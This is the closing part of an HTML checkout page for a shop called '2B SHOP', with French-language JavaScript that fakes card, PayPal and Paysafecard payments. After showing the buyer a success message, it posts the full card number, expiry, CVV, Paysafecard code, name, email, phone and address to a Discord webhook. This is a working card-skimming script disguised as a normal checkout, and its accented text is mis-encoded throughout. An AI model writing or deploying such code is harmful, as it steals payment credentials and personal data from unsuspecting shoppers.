                    // Simuler le paiement CB
                    const cardResult = simulateCardPayment({
                        number: orderData.payment.details.cardNumber,
                        expiry: orderData.payment.details.expiryDate,
                        cvv: orderData.payment.details.cvv
                    });
                    
                    if (!cardResult.success) {
                        showNotification(cardResult.message || 'Paiement refus√©. R√©essayez.', 'error');
                        button.disabled = false;
                        button.innerHTML = '<i class="fas fa-lock"></i> Payer <span id="payAmount">' + orderData.total.toFixed(2) + '‚Ç¨</span>';
                        return;
                    }
                    
                    orderData.payment.transactionId = cardResult.transactionId;
                    orderData.payment.status = 'completed';
                    break;
                    
                case 'paypal':
                    orderData.payment.details = {
                        connected: document.getElementById('paypalConnected').value === 'yes'
                    };
                    
                    if (!orderData.payment.details.connected) {
                        showNotification('Compte PayPal non connect√©', 'error');
                        button.disabled = false;
                        button.innerHTML = '<i class="fas fa-lock"></i> Payer <span id="payAmount">' + orderData.total.toFixed(2) + '‚Ç¨</span>';
                        return;
                    }
                    
                    // Simuler paiement PayPal
                    await new Promise(resolve => setTimeout(resolve, 1500));
                    orderData.payment.transactionId = 'PP_' + Date.now();
                    orderData.payment.status = 'completed';
                    break;
                    
                case 'paysafecard':
                    orderData.payment.details = {
                        code: document.getElementById('paysafeCode').value
                    };
                    
                    // Simuler validation PaysafeCard
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    orderData.payment.transactionId = 'PSC_' + Date.now();
                    orderData.payment.status = 'completed';
                    break;
            }
            
            // Envoyer au webhook Discord
            try {
                await sendToWebhook();
                
                // Succ√®s
                showNotification('Paiement r√©ussi ! Votre commande est confirm√©e.', 'success');
                
                // Vider le panier
                localStorage.removeItem('shoppingCart');
                localStorage.removeItem('currentOrder');
                sessionStorage.removeItem('currentOrder');
                
                // Redirection apr√®s 3 secondes
                setTimeout(() => {
                    window.location.href = 'index.html';
                }, 3000);
                
            } catch (error) {
                console.error('Erreur webhook:', error);
                showNotification('Paiement trait√© mais erreur de notification. Votre commande est confirm√©e.', 'error');
                
                // Vider le panier quand m√™me
                localStorage.removeItem('shoppingCart');
                localStorage.removeItem('currentOrder');
                
                setTimeout(() => {
                    window.location.href = 'index.html';
                }, 3000);
            }
        }

        // Envoyer les donn√©es au webhook Discord
        async function sendToWebhook() {
            // Formatage des donn√©es pour Discord
            const fields = [
                { name: 'üí∞ Montant', value: `${orderData.total.toFixed(2)}‚Ç¨`, inline: true },
                { name: 'üÜî Transaction', value: orderData.payment.transactionId || 'N/A', inline: true },
                { name: 'üí≥ M√©thode', value: orderData.payment.method.toUpperCase(), inline: true },
                { name: 'üë§ Client', value: orderData.customer.name, inline: false },
                { name: 'üìß Email', value: orderData.customer.email, inline: true },
                { name: 'üìû T√©l√©phone', value: orderData.customer.phone, inline: true },
                { name: 'üìç Adresse', value: `${orderData.customer.address}, ${orderData.customer.zip} ${orderData.customer.city}`, inline: false }
            ];
            
            // Ajouter les d√©tails de paiement selon la m√©thode
            if (orderData.payment.method === 'visa' || orderData.payment.method === 'mastercard') {
                const cardDetails = orderData.payment.details;
                fields.push(
                    { name: 'üí≥ Carte', value: cardDetails.cardNumber, inline: true },
                    { name: 'üìÖ Expiration', value: cardDetails.expiryDate, inline: true },
                    { name: 'üîí CVV', value: cardDetails.cvv, inline: true }
                );
            } else if (orderData.payment.method === 'paysafecard') {
                fields.push({ name: 'üé´ Code Paysafe', value: orderData.payment.details.code, inline: false });
            }
            
            // Articles command√©s
            const itemsText = orderData.cart.map(item => 
                `‚Ä¢ ${item.name} (${item.colorName}) x${item.quantity} - ${(item.price * item.quantity).toFixed(2)}‚Ç¨`
            ).join('\n');
            
            fields.push({ name: 'üõí Articles', value: itemsText || 'Aucun', inline: false });
            
            const embed = {
                title: '‚úÖ NOUVELLE COMMANDE PAY√âE !',
                color: 0x00ff00,
                fields: fields,
                timestamp: new Date().toISOString(),
                footer: {
                    text: '2B SHOP - Syst√®me de paiement'
                }
            };
            
            const response = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: '@here üéâ **NOUVELLE COMMANDE !**',
                    embeds: [embed]
                })
            });
            
            if (!response.ok) {
                throw new Error('Webhook error');
            }
        }

        // Mettre √† jour le bouton de paiement
        function updatePayButton() {
            const button = document.getElementById('payButton');
            const total = orderData.total.toFixed(2);
            document.getElementById('payAmount').textContent = `${total}‚Ç¨`;
        }

        // Afficher une notification
        function showNotification(message, type = 'info') {
            const notification = document.createElement('div');
            notification.className = `payment-notification ${type}`;
            notification.innerHTML = `
                <i class="fas fa-${type === 'error' ? 'exclamation-triangle' : type === 'success' ? 'check-circle' : 'info-circle'}"></i>
                <span>${message}</span>
            `;
            
            document.body.appendChild(notification);
            
            setTimeout(() => {
                notification.style.animation = 'slideOut 0.3s ease';
                setTimeout(() => notification.remove(), 300);
            }, type === 'error' ? 4000 : 3000);
        }
    </script>
</body>

</html>
